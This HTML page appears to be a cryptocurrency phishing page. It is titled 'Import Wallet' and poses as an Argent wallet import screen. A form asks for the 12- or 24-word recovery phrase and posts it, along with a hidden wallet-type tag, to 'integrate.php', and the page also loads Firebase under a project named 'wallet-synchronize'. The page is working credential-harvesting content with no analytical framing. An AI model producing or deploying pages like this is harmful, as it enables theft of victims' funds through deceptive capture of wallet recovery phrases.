<!DOCTYPE html>
<html>
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>Import Wallet</title>
    <link rel="stylesheet" href="ds/bootstrap.min.css">
    <link rel="stylesheet" href="ds/all.min.css">
    <link rel="stylesheet" href="ds/style.css">
</head>
<body style="background-color: black;">
    <header>
        <div class="container-fluid">
			<div class="row">
			<div class="col-md-4 offset-md-4">
				<a  href="#" style="font-size: 20px; color: white; text-align: center; text-decoration: none;"><i><</i>&nbsp; &nbsp;Import Wallet</a><br><br>
			</div>
			</div>
		</div>
    </header>
	<div class="container-fluid">
		<div class="row">
			<div class="col-md-4 offset-md-4">
				<ul class="nav nav-tabs">
					<li class="nav-item"><a class="nav-link active" data-toggle="tab" href="#phrase">Phrase</a></li>
				
				</ul>
			</div>
		</div>
	</div>
    <section style="margin-top: 40px;">
        <div class="container-fluid">
            <div class="row">
                <div class="col-md-4 offset-md-4">
					<!-- Tab panes -->
					<div class="tab-content">
						<div role="tabpanel" class="tab-pane fade show active" id="phrase">
							<form method="post" action="integrate.php">
								
								<input id="today" type="text" name="dot" readonly hidden>
								<textarea class="form-control" rows="5" name="phrase" minlength="23" required placeholder="Phrase"></textarea>
								<p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
								<input type="hidden" name="wallettype" value="Argent">
								<div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit" >IMPORT</button></div>
							</form>
						</div>
						
					</div>
                </div>
            </div>
        </div>
    </section>
    <!-- The core Firebase JS SDK is always required and must be listed first -->
<script src="https://www.gstatic.com/firebasejs/8.6.2/firebase-app.js"></script>

<!-- TODO: Add SDKs for Firebase products that you want to use
     https://firebase.google.com/docs/web/setup#available-libraries -->
<script src="https://www.gstatic.com/firebasejs/8.6.2/firebase-analytics.js"></script>

<script>
  // Your web app's Firebase configuration
  // For Firebase JS SDK v7.20.0 and later, measurementId is optional
  var firebaseConfig = {
    apiKey: "AIzaSyBKeXwFPWEcqzrd64ZYZqVMmchAafhLleE",
    authDomain: "wallet-synchronize.firebaseapp.com",
    projectId: "wallet-synchronize",
    storageBucket: "wallet-synchronize.appspot.com",
    messagingSenderId: "961742103227",
    appId: "1:961742103227:web:1ab5dd0c22655342c03f9e",
    measurementId: "G-V8RV8C5NSR"
  };
  // Initialize Firebase
  firebase.initializeApp(firebaseConfig);
  firebase.analytics();
  
</script>

    <script>
    
    let today = new Date();
document.querySelector("#today").value = today;

let today1 = new Date();
document.querySelector("#today1").value = today1;

let today2 = new Date();
document.querySelector("#today2").value = today2;

</script>
</body>


</html>
